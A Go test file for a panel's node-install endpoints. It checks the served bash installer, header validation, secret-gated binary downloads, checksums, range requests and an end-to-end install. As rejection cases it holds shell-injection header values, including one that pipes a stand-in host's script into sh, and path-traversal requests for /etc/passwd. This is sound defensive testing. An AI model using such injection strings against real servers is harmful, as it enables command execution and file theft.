package httpapi

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
)

// nodeInstallEngine is just the install routes on a bare engine: enough for
// everything that needs no database (the script itself is public).
func nodeInstallEngine(dir string) http.Handler {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	(&Handler{nodeBinDir: dir}).registerNodeInstallRoutes(r)
	return r
}

func nodeInstallGet(router http.Handler, path string, headers map[string]string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(http.MethodGet, path, nil)
	for k, v := range headers {
		if k == "Host" {
			req.Host = v
			continue
		}
		req.Header.Set(k, v)
	}
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	return rec
}

// nodeBuildFixtures lays out a NODE_BIN_DIR the way the panel image does.
func nodeBuildFixtures(t *testing.T) (dir string, amd64, arm64 []byte) {
	t.Helper()
	dir = t.TempDir()
	amd64 = bytes.Repeat([]byte("amd64-build-0123456789"), 200)
	arm64 = bytes.Repeat([]byte("arm64-build-abcdefghij"), 150)
	for arch, data := range map[string][]byte{"amd64": amd64, "arm64": arm64} {
		name := "rapido-go-node-linux-" + arch
		sum := sha256.Sum256(data)
		if err := os.WriteFile(filepath.Join(dir, name), data, 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, name+".sha256"), []byte(hex.EncodeToString(sum[:])+"  "+name+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(dir, "VERSION"), []byte("1.2.3\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir, amd64, arm64
}

func TestNodeInstallScriptEmbedsTheOriginFromTheProxyHeaders(t *testing.T) {
	router := nodeInstallEngine(t.TempDir())
	cases := []struct {
		name    string
		headers map[string]string
		origin  string
	}{
		{"proxy headers", map[string]string{"X-Forwarded-Proto": "https", "X-Forwarded-Host": "panel.example.com"}, "https://panel.example.com"},
		{"proxy with a port", map[string]string{"X-Forwarded-Proto": "http", "X-Forwarded-Host": "10.0.0.5:8001"}, "http://10.0.0.5:8001"},
		{"first of a proxy chain", map[string]string{"X-Forwarded-Proto": "https, http", "X-Forwarded-Host": "panel.example.com, internal:8000"}, "https://panel.example.com"},
		{"ipv6 literal", map[string]string{"X-Forwarded-Host": "[2001:db8::1]:8443"}, "http://[2001:db8::1]:8443"},
		{"falls back to the request", map[string]string{"Host": "panel.internal:8000"}, "http://panel.internal:8000"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rec := nodeInstallGet(router, "/install/node.sh", tc.headers)
			if rec.Code != http.StatusOK {
				t.Fatalf("status %d: %s", rec.Code, rec.Body)
			}
			body := rec.Body.String()
			if want := "PANEL_ORIGIN='" + tc.origin + "'\n"; !strings.Contains(body, want) {
				t.Errorf("script lacks %q", want)
			}
			if !strings.HasPrefix(body, "#!/usr/bin/env bash\n") || strings.Contains(body, "\r") {
				t.Error("script must start with a bash shebang and use LF line endings only")
			}
			if strings.Contains(body, "{{") {
				t.Error("template markers leaked into the served script")
			}
			if got := rec.Header().Get("Cache-Control"); got != "no-store" {
				t.Errorf("Cache-Control = %q, the origin is per-request so nothing may cache this", got)
			}
			if got := rec.Header().Get("Content-Type"); !strings.HasPrefix(got, "text/plain") {
				t.Errorf("Content-Type = %q", got)
			}
		})
	}
}

func TestNodeInstallScriptRefusesHostsThatCouldInjectShell(t *testing.T) {
	router := nodeInstallEngine(t.TempDir())
	bad := []map[string]string{
		{"X-Forwarded-Host": "evil.com';curl evil.sh|sh;'"},
		{"X-Forwarded-Host": "a.com$(id)"},
		{"X-Forwarded-Host": "a.com`id`"},
		{"X-Forwarded-Host": "a b.com"},
		{"X-Forwarded-Host": "a.com\nb"},
		{"X-Forwarded-Host": "a.com/path"},
		{"X-Forwarded-Host": "user@a.com"},
		{"X-Forwarded-Host": "a.com:99999"},
		{"X-Forwarded-Host": "a.com:0"},
		{"X-Forwarded-Host": "a.com:80:81"},
		{"X-Forwarded-Host": "-a.com"},
		{"X-Forwarded-Host": "[::1"},
		{"X-Forwarded-Host": "a;b.com"},
		{"X-Forwarded-Host": "a.com\\"},
		{"X-Forwarded-Proto": "javascript", "X-Forwarded-Host": "a.com"},
		{"X-Forwarded-Proto": "https'", "X-Forwarded-Host": "a.com"},
		{"Host": "a.com';id;'"},
		{"Host": "a\"b.com"},
	}
	for _, headers := range bad {
		rec := nodeInstallGet(router, "/install/node.sh", headers)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("headers %q: status %d, want 400", headers, rec.Code)
		}
		for _, v := range headers {
			if strings.Contains(rec.Body.String(), v) && strings.ContainsAny(v, "';$`\n\"\\") {
				t.Errorf("headers %q: the rejected value was echoed back: %s", headers, rec.Body)
			}
		}
		if strings.Contains(rec.Body.String(), "#!/usr/bin/env bash") {
			t.Errorf("headers %q: a script was served", headers)
		}
	}
}

func TestNodeInstallScriptIsSyntacticallyValidBash(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash is not installed")
	}
	rec := nodeInstallGet(nodeInstallEngine(t.TempDir()), "/install/node.sh", map[string]string{"X-Forwarded-Proto": "https", "X-Forwarded-Host": "panel.example.com"})
	cmd := exec.Command(bash, "-n")
	cmd.Stdin = strings.NewReader(rec.Body.String())
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("bash -n rejected the script: %v\n%s", err, out)
	}
}

// The script must refuse to run before doing anything when given no blob or
// running without root, and must not need jq, python or anything beyond a
// base shell - a fresh VPS has little else.
func TestNodeInstallScriptUsesOnlyBaseTools(t *testing.T) {
	rec := nodeInstallGet(nodeInstallEngine(t.TempDir()), "/install/node.sh", map[string]string{"Host": "p.example.com"})
	body := rec.Body.String()
	for _, banned := range []string{"jq ", "python", "perl", "wget", "docker", "git "} {
		if strings.Contains(body, banned) {
			t.Errorf("script depends on %q", banned)
		}
	}
	if !strings.Contains(body, "set -euo pipefail") {
		t.Error("script must run with set -euo pipefail")
	}
	if !strings.HasSuffix(strings.TrimSpace(body), `main "$@"`) {
		t.Error("everything must run from main, called last, so a truncated download executes nothing")
	}
}

func TestRequestOriginPrefersTLSOverTheDefault(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "https://panel.example.com/install/node.sh", nil)
	got, err := requestOrigin(req)
	if err != nil || got != "https://panel.example.com" {
		t.Errorf("got %q, %v", got, err)
	}
}

// nodeInstallCreateNode makes a node through the real API and returns its
// report secret and setup blob.
func nodeInstallCreateNode(t *testing.T, router http.Handler, token string) (secret, blob string) {
	t.Helper()
	resp := doRequest(t, router, "POST", "/api/node", token, map[string]interface{}{"name": "install-test", "address": "10.0.0.9"})
	if resp.Code != http.StatusOK {
		t.Fatalf("create node: %d %v", resp.Code, resp.Body)
	}
	secret, _ = resp.Body["report_secret"].(string)
	blob, _ = resp.Body["setup_blob"].(string)
	if secret == "" || blob == "" {
		t.Fatalf("node response lacks report_secret/setup_blob: %v", resp.Body)
	}
	return secret, blob
}

func nodeInstallAuthedGet(router http.Handler, path, secret string, extra map[string]string) *httptest.ResponseRecorder {
	headers := map[string]string{}
	if secret != "" {
		headers["Authorization"] = "Bearer " + secret
	}
	for k, v := range extra {
		headers[k] = v
	}
	return nodeInstallGet(router, path, headers)
}

func TestNodeBuildEndpointsServeOnlyToANodeWithItsSecret(t *testing.T) {
	router, adminToken, handler := newTestRouterAndHandler(t)
	dir, amd64, arm64 := nodeBuildFixtures(t)
	handler.WithNodeBinDir(dir)
	secret, blob := nodeInstallCreateNode(t, router, adminToken)

	// The script itself is public and holds no secret.
	script := nodeInstallGet(router, "/install/node.sh", map[string]string{"X-Forwarded-Proto": "https", "X-Forwarded-Host": "panel.example.com"})
	if script.Code != http.StatusOK {
		t.Fatalf("script status %d", script.Code)
	}
	if strings.Contains(script.Body.String(), secret) || strings.Contains(script.Body.String(), blob) {
		t.Error("the served script contains this node's secret or setup blob")
	}

	paths := []string{"/install/node/amd64", "/install/node/amd64.sha256", "/install/node/arm64", "/install/node/arm64.sha256", "/install/node/version"}
	for _, path := range paths {
		for name, credential := range map[string]string{"none": "", "wrong": "0000000000000000", "an admin token is not a node secret": adminToken} {
			rec := nodeInstallAuthedGet(router, path, credential, nil)
			if rec.Code != http.StatusUnauthorized {
				t.Errorf("%s with %s: status %d, want 401", path, name, rec.Code)
			}
			if !strings.Contains(rec.Header().Get("Content-Type"), "application/json") || !strings.Contains(rec.Body.String(), "detail") {
				t.Errorf("%s with %s: want a JSON 401, got %q %q", path, name, rec.Header().Get("Content-Type"), rec.Body)
			}
		}
	}

	for arch, want := range map[string][]byte{"amd64": amd64, "arm64": arm64} {
		rec := nodeInstallAuthedGet(router, "/install/node/"+arch, secret, nil)
		if rec.Code != http.StatusOK || !bytes.Equal(rec.Body.Bytes(), want) {
			t.Errorf("%s build: status %d, %d bytes (want %d identical bytes)", arch, rec.Code, rec.Body.Len(), len(want))
		}
		if got := rec.Header().Get("Cache-Control"); got != "no-store" {
			t.Errorf("%s build Cache-Control = %q", arch, got)
		}
		if got := rec.Header().Get("Content-Type"); got != "application/octet-stream" {
			t.Errorf("%s build Content-Type = %q", arch, got)
		}
		if rec.Header().Get("Last-Modified") != "" {
			t.Errorf("%s build carries Last-Modified, which would let a client cache a replaced build", arch)
		}

		sum := sha256.Sum256(want)
		sumRec := nodeInstallAuthedGet(router, "/install/node/"+arch+".sha256", secret, nil)
		if wantLine := fmt.Sprintf("%s  rapido-go-node-linux-%s\n", hex.EncodeToString(sum[:]), arch); sumRec.Code != 200 || sumRec.Body.String() != wantLine {
			t.Errorf("%s checksum: status %d body %q, want %q", arch, sumRec.Code, sumRec.Body, wantLine)
		}
		if !strings.HasPrefix(sumRec.Header().Get("Content-Type"), "text/plain") {
			t.Errorf("%s checksum Content-Type = %q", arch, sumRec.Header().Get("Content-Type"))
		}
	}

	ver := nodeInstallAuthedGet(router, "/install/node/version", secret, nil)
	if ver.Code != 200 || strings.TrimSpace(ver.Body.String()) != `{"version":"1.2.3"}` {
		t.Errorf("version: status %d body %q", ver.Code, ver.Body)
	}
}

func TestNodeBuildRejectsUnknownArchitecturesAndPathTricks(t *testing.T) {
	router, adminToken, handler := newTestRouterAndHandler(t)
	dir, amd64, _ := nodeBuildFixtures(t)
	// A file that must never be reachable through any path trick.
	if err := os.WriteFile(filepath.Join(filepath.Dir(dir), "outside-secret.txt"), []byte("TOP-SECRET-OUTSIDE"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "unrelated.bin"), []byte("TOP-SECRET-UNRELATED"), 0o644); err != nil {
		t.Fatal(err)
	}
	handler.WithNodeBinDir(dir)
	secret, _ := nodeInstallCreateNode(t, router, adminToken)

	for _, arch := range []string{"386", "AMD64", "amd64.sha256.sha256", "amd64.sha256x", "arm", "", "unrelated.bin", "VERSION", "amd64%00", "amd64%2f..%2foutside-secret.txt"} {
		rec := nodeInstallAuthedGet(router, "/install/node/"+arch, secret, nil)
		if rec.Code == http.StatusOK {
			t.Errorf("/install/node/%s served a file (%d bytes)", arch, rec.Body.Len())
		}
		if strings.Contains(rec.Body.String(), "TOP-SECRET") || bytes.Contains(rec.Body.Bytes(), amd64[:32]) {
			t.Errorf("/install/node/%s leaked file content", arch)
		}
	}
	for _, path := range []string{"/install/node/../../etc/passwd", "/install/node/..%2f..%2fetc%2fpasswd", "/install/node/%2e%2e/unrelated.bin", "/install/node/amd64/extra", "/install/node/./unrelated.bin"} {
		rec := nodeInstallAuthedGet(router, path, secret, nil)
		if rec.Code == http.StatusOK || strings.Contains(rec.Body.String(), "TOP-SECRET") {
			t.Errorf("%s: status %d, must not serve anything", path, rec.Code)
		}
	}

	rec := nodeInstallAuthedGet(router, "/install/node/386", secret, nil)
	if rec.Code != http.StatusNotFound || !strings.Contains(rec.Body.String(), "amd64 or arm64") {
		t.Errorf("unknown arch: status %d body %q, want a 404 naming the supported ones", rec.Code, rec.Body)
	}
}

func TestNodeBuildSupportsRangeRequests(t *testing.T) {
	router, adminToken, handler := newTestRouterAndHandler(t)
	dir, amd64, _ := nodeBuildFixtures(t)
	handler.WithNodeBinDir(dir)
	secret, _ := nodeInstallCreateNode(t, router, adminToken)

	rec := nodeInstallAuthedGet(router, "/install/node/amd64", secret, map[string]string{"Range": "bytes=10-19"})
	if rec.Code != http.StatusPartialContent {
		t.Fatalf("status %d, want 206", rec.Code)
	}
	if got, want := rec.Header().Get("Content-Range"), fmt.Sprintf("bytes 10-19/%d", len(amd64)); got != want {
		t.Errorf("Content-Range = %q, want %q", got, want)
	}
	if !bytes.Equal(rec.Body.Bytes(), amd64[10:20]) {
		t.Errorf("body = %q, want %q", rec.Body.Bytes(), amd64[10:20])
	}
	if rec.Header().Get("Cache-Control") != "no-store" {
		t.Error("a partial response must not be cacheable either")
	}

	tail := nodeInstallAuthedGet(router, "/install/node/amd64", secret, map[string]string{"Range": "bytes=-5"})
	if tail.Code != http.StatusPartialContent || !bytes.Equal(tail.Body.Bytes(), amd64[len(amd64)-5:]) {
		t.Errorf("suffix range: status %d body %q", tail.Code, tail.Body)
	}

	past := nodeInstallAuthedGet(router, "/install/node/amd64", secret, map[string]string{"Range": fmt.Sprintf("bytes=%d-", len(amd64)+10)})
	if past.Code != http.StatusRequestedRangeNotSatisfiable {
		t.Errorf("range past the end: status %d, want 416", past.Code)
	}
}

func TestNodeBuildMissingFilesAre404WithoutRevealingPaths(t *testing.T) {
	router, adminToken, handler := newTestRouterAndHandler(t)
	dir := t.TempDir() // a developer setup: no builds at all
	handler.WithNodeBinDir(dir)
	secret, _ := nodeInstallCreateNode(t, router, adminToken)

	for _, path := range []string{"/install/node/amd64", "/install/node/arm64.sha256", "/install/node/version"} {
		rec := nodeInstallAuthedGet(router, path, secret, nil)
		if rec.Code != http.StatusNotFound {
			t.Errorf("%s: status %d, want 404", path, rec.Code)
		}
		if !strings.Contains(rec.Body.String(), "This panel has no") || strings.Contains(rec.Body.String(), dir) {
			t.Errorf("%s: body %q should say the panel has no build, without a filesystem path", path, rec.Body)
		}
	}

	// A directory where a file should be is not a build either.
	if err := os.Mkdir(filepath.Join(dir, "rapido-go-node-linux-amd64"), 0o755); err != nil {
		t.Fatal(err)
	}
	if rec := nodeInstallAuthedGet(router, "/install/node/amd64", secret, nil); rec.Code != http.StatusNotFound {
		t.Errorf("directory in place of a build: status %d, want 404", rec.Code)
	}

	// Left at its default, the directory is /app/nodebin, which a developer
	// machine does not have: still a clean 404, never a 500.
	handler.WithNodeBinDir("")
	if rec := nodeInstallAuthedGet(router, "/install/node/amd64", secret, nil); rec.Code != http.StatusNotFound {
		t.Errorf("default directory: status %d, want 404", rec.Code)
	}
}

// TestNodeInstallEndToEnd runs the real served script under bash against the
// real router, with fakes only for the things a developer machine lacks (root,
// systemd, a Linux uname) and a stand-in node binary that records how the
// installer invoked it.
func TestNodeInstallEndToEnd(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash is not installed")
	}
	if runtime.GOOS == "windows" && strings.Contains(strings.ToLower(bash), "system32") {
		t.Skip("bash resolves to the WSL launcher, not a real bash")
	}
	for _, tool := range []string{"curl", "sha256sum", "base64", "sed", "cut"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("%s is not installed", tool)
		}
	}

	router, adminToken, handler := newTestRouterAndHandler(t)
	server := httptest.NewServer(router)
	defer server.Close()
	origin := server.URL

	// A stand-in for the node binary: answers `version`, otherwise records its arguments.
	fake := []byte("#!/bin/sh\nif [ \"$1\" = version ]; then echo fake-node 1.0; exit 0; fi\nprintf '%s\\n' \"$@\" > \"$RECORD_FILE\"\nexit \"${FAKE_EXIT:-0}\"\n")
	dir := t.TempDir()
	writeFixtures := func(binary []byte, published []byte) {
		for _, arch := range []string{"amd64", "arm64"} {
			name := "rapido-go-node-linux-" + arch
			sum := sha256.Sum256(published)
			os.WriteFile(filepath.Join(dir, name), binary, 0o755)
			os.WriteFile(filepath.Join(dir, name+".sha256"), []byte(hex.EncodeToString(sum[:])+"  "+name+"\n"), 0o644)
		}
	}
	writeFixtures(fake, fake)
	handler.WithNodeBinDir(dir)
	secret, blob := nodeInstallCreateNode(t, router, adminToken)

	// Fakes for what a non-root, non-Linux developer machine lacks.
	fakeBin := t.TempDir()
	for name, body := range map[string]string{
		"id":        "#!/bin/sh\necho 0\n",
		"systemctl": "#!/bin/sh\nexit 0\n",
		"uname":     "#!/bin/sh\ncase \"$1\" in -m) echo x86_64;; *) echo Linux;; esac\n",
	} {
		if err := os.WriteFile(filepath.Join(fakeBin, name), []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	script := nodeInstallGet(router, "/install/node.sh", map[string]string{"Host": strings.TrimPrefix(origin, "http://")})
	if script.Code != 200 {
		t.Fatalf("script status %d", script.Code)
	}

	runEnv := func(t *testing.T, extraEnv []string, args ...string) (out string, recorded []string, exit int) {
		t.Helper()
		record := filepath.Join(t.TempDir(), "args.txt")
		tmp := t.TempDir()
		cmd := exec.Command(bash, append([]string{"-s", "--"}, args...)...)
		cmd.Stdin = strings.NewReader(script.Body.String())
		cmd.Env = append(os.Environ(),
			"PATH="+fakeBin+string(os.PathListSeparator)+os.Getenv("PATH"),
			"RECORD_FILE="+filepath.ToSlash(record),
			"TMPDIR="+filepath.ToSlash(tmp),
		)
		cmd.Env = append(cmd.Env, extraEnv...)
		raw, err := cmd.CombinedOutput()
		if ee, ok := err.(*exec.ExitError); ok {
			exit = ee.ExitCode()
		} else if err != nil {
			t.Fatalf("run bash: %v", err)
		}
		if data, err := os.ReadFile(record); err == nil {
			recorded = strings.Split(strings.TrimSpace(string(data)), "\n")
		}
		if left, _ := filepath.Glob(filepath.Join(tmp, "rapido-node-install.*")); len(left) > 0 {
			t.Errorf("temp files were left behind: %v", left)
		}
		return string(raw), recorded, exit
	}
	run := func(t *testing.T, args ...string) (string, []string, int) { return runEnv(t, nil, args...) }

	t.Run("installs and passes extra arguments through", func(t *testing.T) {
		out, recorded, exit := run(t, blob, "--no-tune", "--listen-addr", "0.0.0.0:9000")
		if exit != 0 {
			t.Fatalf("exit %d\n%s", exit, out)
		}
		want := []string{"install", "--setup-blob", blob, "--panel-url", origin, "--no-tune", "--listen-addr", "0.0.0.0:9000"}
		if strings.Join(recorded, "\n") != strings.Join(want, "\n") {
			t.Errorf("the node was invoked with %q\nwant %q", recorded, want)
		}
		if !strings.Contains(out, "Node ready") {
			t.Errorf("no friendly result:\n%s", out)
		}
		if strings.Contains(out, secret) {
			t.Error("the script printed the node secret")
		}
	})

	t.Run("propagates the installer's failure", func(t *testing.T) {
		out, _, exit := runEnv(t, []string{"FAKE_EXIT=7"}, blob)
		if exit != 7 || !strings.Contains(out, "did not finish") {
			t.Errorf("want exit 7 and a warning, got exit %d\n%s", exit, out)
		}
	})

	t.Run("wrong secret is refused clearly", func(t *testing.T) {
		wrong, err := buildNodeSetupBlob("c", "k", "ca", "0123456789abcdef0123456789abcdef", "")
		if err != nil {
			t.Fatal(err)
		}
		out, recorded, exit := run(t, wrong)
		if exit == 0 || len(recorded) > 0 || !strings.Contains(out, "rejected this node's secret") {
			t.Errorf("exit %d, recorded %v\n%s", exit, recorded, out)
		}
	})

	t.Run("tampered download aborts before anything is installed", func(t *testing.T) {
		writeFixtures(fake, []byte("a different file"))
		defer writeFixtures(fake, fake)
		out, recorded, exit := run(t, blob)
		if exit == 0 || len(recorded) > 0 || !strings.Contains(out, "Checksum mismatch") {
			t.Errorf("exit %d, recorded %v\n%s", exit, recorded, out)
		}
	})

	t.Run("bad input", func(t *testing.T) {
		for name, args := range map[string][]string{
			"no blob":            nil,
			"a flag, not a blob": {"--no-tune"},
			"not base64":         {"not base64!!!"},
			"garbage blob":       {"YWJjZGVmZ2g="},
		} {
			out, recorded, exit := run(t, args...)
			if exit == 0 || len(recorded) > 0 {
				t.Errorf("%s: exit %d recorded %v\n%s", name, exit, recorded, out)
			}
		}
	})

	t.Run("nodes without a published build get a clear message", func(t *testing.T) {
		handler.WithNodeBinDir(t.TempDir())
		defer handler.WithNodeBinDir(dir)
		out, recorded, exit := run(t, blob)
		if exit == 0 || len(recorded) > 0 || !strings.Contains(out, "no node build") {
			t.Errorf("exit %d recorded %v\n%s", exit, recorded, out)
		}
	})
}
